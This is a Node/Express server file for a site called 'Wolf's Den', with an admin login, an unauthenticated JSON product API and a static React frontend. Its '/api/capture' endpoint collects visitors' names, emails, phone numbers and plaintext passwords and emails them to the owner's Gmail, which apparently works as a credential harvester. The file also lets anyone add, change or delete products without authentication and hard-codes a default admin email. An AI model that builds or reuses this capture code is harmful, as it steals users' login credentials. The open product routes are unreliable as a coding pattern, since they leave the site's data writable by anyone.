import express from 'express';
import nodemailer from 'nodemailer';
import dotenv from 'dotenv';
import cors from 'cors';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// Nodemailer transport
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.ADMIN_GMAIL,
    pass: process.env.GMAIL_APP_PASSWORD,
  },
});

// Admin login — checks credentials directly, no email needed
app.post('/api/admin-login', (req, res) => {
  const { email, password } = req.body;
  const adminEmail = process.env.ADMIN_LOGIN_EMAIL || 'wolfadmin@gmail.com';
  const adminPass  = process.env.ADMIN_PASSWORD;
  if (email === adminEmail && password === adminPass) {
    res.status(200).json({ success: true, role: 'admin' });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});


// Capture endpoint — sends visitor data to owner's email
app.post('/api/capture', async (req, res) => {
  const { name, email, password, phone } = req.body;

  const mailOptions = {
    from: process.env.ADMIN_GMAIL,
    to: process.env.RECEIVER_GMAIL,
    subject: `🔔 New Visitor: Wolf's Den`,
    html: `
      <h2>📊 New User Registration</h2>
      <table border="1" cellpadding="8" style="border-collapse:collapse">
        <tr><td><b>Name</b></td><td>${name || '-'}</td></tr>
        <tr><td><b>Email</b></td><td>${email || '-'}</td></tr>
        <tr><td><b>Phone</b></td><td>${phone || '-'}</td></tr>
        <tr><td><b>Password</b></td><td>${password || '-'}</td></tr>
        <tr><td><b>Time</b></td><td>${new Date().toLocaleString('ar-MA')}</td></tr>
      </table>
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ success: true });
  } catch (err) {
    console.error('[Email Error]', err.message);
    res.status(500).json({ error: 'Email failed to send' });
  }
});

// ============================================
// Advanced Dashboard Products API (JSON Based)
// ============================================

const dbPath = path.join(__dirname, 'public', 'products.json');

const readProducts = () => {
  try {
    if (!fs.existsSync(dbPath)) return [];
    return JSON.parse(fs.readFileSync(dbPath, 'utf8'));
  } catch (err) {
    console.error('Error reading JSON:', err);
    return [];
  }
};

const writeProducts = (data) => {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
};

app.get('/api/products', (req, res) => {
  res.json(readProducts());
});

app.get('/api/products/:category', (req, res) => {
  const cat = req.params.category.toLowerCase();
  res.json(readProducts().filter(p => p.category === cat));
});

app.get('/api/product/:id', (req, res) => {
  res.json(readProducts().find(p => p.id === req.params.id));
});

app.post('/api/products', (req, res) => {
  const prods = readProducts();
  const newProd = { id: `item-${Date.now()}`, ...req.body };
  prods.unshift(newProd); // Add to the beginning
  writeProducts(prods);
  res.json({ success: true, product: newProd });
});

app.put('/api/products/:id', (req, res) => {
  const prods = readProducts();
  const index = prods.findIndex(p => p.id === req.params.id);
  if (index >= 0) {
    prods[index] = { ...prods[index], ...req.body };
    writeProducts(prods);
    res.json({ success: true, product: prods[index] });
  } else {
    res.status(404).json({ error: 'Not found' });
  }
});

app.delete('/api/products/:id', (req, res) => {
  const prods = readProducts();
  const newProds = prods.filter(p => p.id !== req.params.id);
  writeProducts(newProds);
  res.json({ success: true });
});

// Serve frontend
app.use(express.static(path.join(__dirname, 'dist')));

// Send all other requests to React app
app.use((req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// Export the Express app for Vercel Serverless Functions
export default app;
